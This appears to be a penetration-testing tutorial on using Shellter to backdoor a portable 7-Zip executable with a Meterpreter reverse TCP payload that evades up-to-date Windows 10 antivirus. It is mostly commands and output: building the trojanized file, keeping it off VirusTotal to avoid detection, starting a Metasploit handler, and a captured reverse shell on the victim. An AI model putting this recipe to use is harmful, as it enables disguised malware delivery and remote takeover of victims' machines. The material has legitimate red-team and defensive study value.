Shellter – The ultimate tool for AV evasion

Shellter Website - <https://www.shellterproject.com/><br>
<br>
**Attacker:** Kali Linux<br>
**Victim:** Windows 10 (fully patched, fully updated antivirus)
##Introduction
Shellter is a tool for injecting dynamic shellcode into win32 exe’s. The shellcode can be yours, or something you generate via a 3rd party framework such as Metasploit.<br>
Shellter preserves the original structure of the target executable and can be used in either Automatic or Manual mode. It can also be used to create encoded/self-decrypting payloads.<br>
<br>
In this tutorial, we will cover the automatic mode of operation.<br>
##Installation
You can either download and install Shellter from the Shellter Website or install using apt-get in Kali:
<code>
<div class="code">
root@kali:~$ <com>apt-get update && apt-get install shellter</com>
</div>
</code>
##Payload Creation
Start shellter and select [A] for automatic mode, then select your target .exe file.
<code>
<div class="code">
root@kali:~$ <com>shellter</com><br>
Choose Operation Mode - Auto/Manual (A/M/H): <com>A</com><br>
PE Target: <com>/root/Downloads/7-ZipPortable.exe</com>
</div>
</code>
On the payload menu, select [L] then [1] for Meterpreter_Reverse_TCP.<br>
Enter your IP address and port you wish to use the payload on.<br>
Note: If you select Stealth Mode, you must set [exitfunc] to [thread] in Metasploit.
<code>
<div class="code">
************<br>
* Payloads *<br>
************<br>
<br>
[1] Meterpreter_Reverse_TCP<br>
[2] Meterpreter_Reverse_HTTP<br>
[3] Meterpreter_Reverse_HTTPS<br>
[4] Meterpreter_Bind_TCP<br>
[5] Shell_Reverse_TCP<br>
[6] Shell_Bind_TCP<br>
[7] WinExec<br>
<br>
Use a listed payload or custom? (L/C/H): <com>L</com><br>
Select payload by index: <com>1</com><br>
SET LHOST: <com>192.168.1.162</com><br>
SET LPORT: <com>4321</com>
</div>
</code>
Shellter will now encode and obfuscate the payload.<br>
When the process is complete, hit [Enter] to exit.<br>
<br>
At this point you can either use the checkvt script from Veil Evasion (<https://www.veil-framework.com/how-to-safely-check-veil-payloads-against-virustotal/>) or Mubix’s vt-notify script (<https://github.com/mubix/vt-notify>) to safely check the payload against Virus Total. Alternatively, use the virus scanner of your target system to confirm the payload is undetectable. DO NOT upload your exe to Virus Total.
##Exploitation
<code>
<div class="code">
root@kali:~$ <com>msfconsole</com><br>
msf > <com>use exploit/multi/handler</com><br>
msf exploit(handler) > <com>set payload windows/meterpreter/reverse_tcp</com><br>
msf exploit(handler) > <com>set lhost 192.168.1.162</com><br>
msf exploit(handler) > <com>set lport 4321</com><br>
msf exploit(handler) > <com>exploit</com>
</div>
</code>
Run the payload on your Victim machine
<code>
<div class="code">
C:\7-ZipPortable><com>7-ZipPortable.exe</com>
</div>
</code>
Back in Kali, a Meterpreter session will open and you now have a reverse shell to your victim Windows 10 machine.
<code>
<div class="code">
[*] Meterpreter session 1 opened (192.168.1.162:4321 -> 192.168.1.11:49627) at 2015-10-05 00:39:33 +1100<br>
<br>
meterpreter > <com>shell</com><br>
Process 3788 created.<br>
Channel 1 created.<br>
Microsoft Windows [Version 10.0.10240]<br>
(c) 2015 Microsoft Corporation. All rights reserved.<br>
<br>
C:\7-ZipPortable> 
</div>
</code>

Tags: av-evasion
